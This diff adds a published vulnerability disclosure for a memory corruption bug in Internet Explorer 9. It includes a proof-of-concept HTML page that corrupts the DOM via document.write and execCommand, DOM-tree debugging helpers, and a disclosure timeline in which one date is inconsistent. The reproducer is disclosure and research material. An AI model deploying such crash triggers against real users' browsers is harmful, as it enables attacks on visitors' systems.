@@ -1,0 +1,182 @@
+<!--
+Source: http://blog.skylined.nl/20161209001.html
+
+Synopsis
+
+A specially crafted web-page can trigger a memory corruption vulnerability in Microsoft Internet Explorer 9. I did not investigate this vulnerability thoroughly, so I cannot speculate on the potential impact or exploitability.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 9
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Java­Script should prevent an attacker from triggering the vulnerable code path.
+
+Details
+
+This bug was found back when I had very little knowledge and tools to do analysis on use-after-free bugs, so I have no details to share. In addition, EIP said they were already aware of the bug and provided no details, this issue appears to have been fixed before ZDI was able to look at it. I have included a number of reports created using a predecessor of Bug­Id below.
+
+Repro.html:
+-->
+
+<html>
+  <head>
+    <script src="get­Element­Tree.js"></script>
+    <script src="show.html"></script>
+    <script>
+      // First tag can be any inline but must NOT be closed yet
+      // Second tag can be anything that's not inline.
+      // "text1" can be anything
+      document.write('<s><br>text1');
+      // The tree is in good shape.
+      show("DOM Tree after first write", get­Element­Tree(document.body));
+      // At this point, it appears that MSIE is still waiting for the first tag from the first write to be closed.
+      // Inserting a P tag using any of the "Justify*"-, "Indent"- or "Outdent"-exec­Commands will mess up the DOM tree,
+      // specifically for the "Justify*"- and "Outdent"-exec­Command:
+      // - the S tag will partially become a child of the P tag:
+      //      P.last­Child == S (but P.child­Nodes = [BR, text1])
+      // - the P tag will partially become a child of the S tag:
+      //      S.first­Child == P and S.child­Nodes = [P] (but S.last­Child = text1)
+      // - The P partially becomes a child of the BODY tag:
+      //      BODY.last­Child = P (but BODY.first­Child = S and BODY.child­Nodes = [S])
+      // (The situation is similar for "Indent", but includes a BLOCKQUOTE element)
+      document.exec­Command('Select­All');
+      document.exec­Command('Justify­Right');
+      show("DOM Tree after outdent", get­Element­Tree(document.body));
+      // At this point, MSIE is not yet crashing. However, another write will corrupt memory:
+      document.write('text2');
+      // You will probably not see this popup. If you do, it will display an obviously corrupt DOM element tree.
+      show("DOM Tree after write", get­Element­Tree(document.body));
+    </script>
+  </head>
+</html>
+
+
+<!--
+get­Element­Tree.js:
+
+function get­Element­Tree(o­Root­Element, b­Include­All) {
+  function get­Element­Name(o­Element) {
+    return o­Element ? (o­Element.tag­Name || o­Element.node­Name + ':"' + o­Element.data + '"') : "null";
+  }
+  function get­Element­Tree­Lines(o­Element, o­Expected­Parent, o­Expected­Previous­Sibling, o­Expected­Next­Sibling,
+      s­First­Line­Prefix, s­Sub­Lines­Prefix) {
+    if (!o­Element) return [s­First­Line­Prefix + "null"];
+    var ao­Children = o­Element.child­Nodes,
+        s­Header = s­First­Line­Prefix + get­Element­Name(o­Element);
+    try {
+      if (o­Expected­Parent && o­Element.parent­Node != o­Expected­Parent)
+          s­Header += " (parent:" + get­Element­Name(o­Element.parent­Node) + ")";
+    } catch (e) {
+      s­Header += " (parent error:" + e.message + ")"; 
+    }
+    try {
+      if (o­Element.previous­Sibling != o­Expected­Previous­Sibling) {
+        s­Header += " (previous­Sibling:" + get­Element­Name(o­Element.previous­Sibling) + ")";
+        o­Expected­Previous­Sibling && ao­Should­Be­Included­Elements.push(o­Element.previous­Sibling);
+      }
+    } catch (e) {
+      s­Header += " (previous­Sibling error:" + e.message + ")"; 
+    }
+    try {
+      if (o­Element.next­Sibling != o­Expected­Next­Sibling) {
+        s­Header += " (next­Sibling:" + get­Element­Name(o­Element.next­Sibling) + ")";
+        o­Expected­Next­Sibling && ao­Should­Be­Included­Elements.push(o­Element.next­Sibling);
+      }
+    } catch (e) {
+      s­Header += " (next­Sibling error:" + e.message + ")"; 
+    }
+    try {
+      if (ao­Children.length > 0 && o­Element.first­Child != ao­Children.item(0)) {
+        s­Header += " (first­Child:" + get­Element­Name(o­Element.first­Child) + ")";
+        ao­Should­Be­Included­Elements.push(o­Element.first­Child);
+      }
+    } catch (e) {
+      s­Header += " (first­Child error:" + e.message + ")"; 
+    }
+    for (var i = 0; i < ao­Actually­Included­Elements.length; i++) {
+      if (ao­Actually­Included­Elements[i] == o­Element) {
+        return [s­Header + " => previously referenced!"];
+      }
+    }
+    var s­Last­Child­Error­Line = null;
+    try {
+      if (ao­Children.length > 0 && o­Element.last­Child != ao­Children.item(ao­Children.length - 1)) {
+        s­Last­Child­Error­Line = s­Sub­Lines­Prefix + "\u2514 last­Child:" + get­Element­Name(o­Element.last­Child);
+        ao­Should­Be­Included­Elements.push(o­Element.last­Child);
+      }
+    } catch (e) {
+      s­Last­Child­Error­Line = s­Sub­Lines­Prefix + "\u2514 last­Child error:" + e.message;
+    }
+    ao­Actually­Included­Elements.push(o­Element);
+    var as­Tree = [s­Header], o­Previous­Sibling = null;
+    for (var i = 0; i < ao­Children.length; i++) {
+      try {
+        var o­Child = ao­Children.item(i)
+      } catch (e) {
+        as­Tree.push(s­Sub­Lines­Prefix + (i == ao­Children.length - 1 ? "\u255A" : "\u2560") + "child error:" + e.message);
+        continue;
+      }
+      try {
+        var o­Next­Sibling = i + 1 <= ao­Children.length - 1 ? ao­Children.item(i + 1) : null;
+      } catch (e) {
+        o­Next­Sibling = "error: " + e.message;
+      }
+      var as­Child­Tree = get­Element­Tree­Lines(o­Child, o­Element, o­Previous­Sibling, o­Next­Sibling, 
+          s­Sub­Lines­Prefix + (i == ao­Children.length - 1 ? "\u255A" : "\u2560"),
+          s­Sub­Lines­Prefix + (i == ao­Children.length - 1 ? (s­Last­Child­Error­Line ? "\u2502" : " ") : "\u2551"));
+      o­Previous­Sibling = o­Child;
+      for (j = 0; j < as­Child­Tree.length; j++) {
+        as­Tree.push(as­Child­Tree[j]);
+      }
+    }
+    if (s­Last­Child­Error­Line) {
+      as­Tree.push(s­Last­Child­Error­Line);
+    }
+    return as­Tree;
+  }
+  var ao­Should­Be­Included­Elements = [o­Root­Element], ao­Actually­Included­Elements = []
+  var as­Tree­Blocks = [];
+  find_­next_­missing_­element:
+  while(ao­Should­Be­Included­Elements.length) {
+    var o­Should­Be­Included­Element = ao­Should­Be­Included­Elements.pop();
+    for (var j = 0; j < ao­Actually­Included­Elements.length; j++) {
+      if (o­Should­Be­Included­Element == ao­Actually­Included­Elements[j]) {
+        continue find_­next_­missing_­element;
+      }
+    }
+    as­Tree­Lines = get­Element­Tree­Lines(o­Should­Be­Included­Element, o­Should­Be­Included­Element.parent­Node,
+        o­Should­Be­Included­Element.previous­Sibling, o­Should­Be­Included­Element.next­Sibling, 
+        o­Should­Be­Included­Element.parent­Node ? "\u255A" : "",
+        o­Should­Be­Included­Element.parent­Node ? " " : "");
+    as­Tree­Blocks.push(as­Tree­Lines.join("\r\n"));
+    if (!b­Include­All) break;
+  }
+  return as­Tree­Blocks.join("\r\n");
+}
+
+
+show.html:
+
+//<!--
+  function show(s­Title, s­Message) {
+    show­Modal­Dialog("show.html", [s­Title, "<pre>" + s­Message + "</pre>"],
+      "dialog­Width:800px; dialog­Height:600px; resizable:yes");
+  }
+/*-->
+<script>
+  document.body.inner­HTML = window.dialog­Arguments[1];
+  document.title = window.dialog­Arguments[0];
+</script>
+<!-- */ // -->
+
+Time-line
+
+27 September 2012: This vulnerability was found through fuzzing.
+7 November 2012: This vulnerability was submitted to EIP.
+27 November 2012: This vulnerability was rejected by EIP.
+28 November 2012: This vulnerability was submitted to ZDI.
+Between December 2012 and February 2013: Microsoft addresses this vulnerability.
+27 February 2012: This vulnerability was rejected by ZDI.
+8 December 2016: Details of this vulnerability are released.
+I would like to note that although ZDI did not acquire the vulnerability as it was patched before they could finish analysis, they did offer me ZDI reward points as a courtesy.
+-->
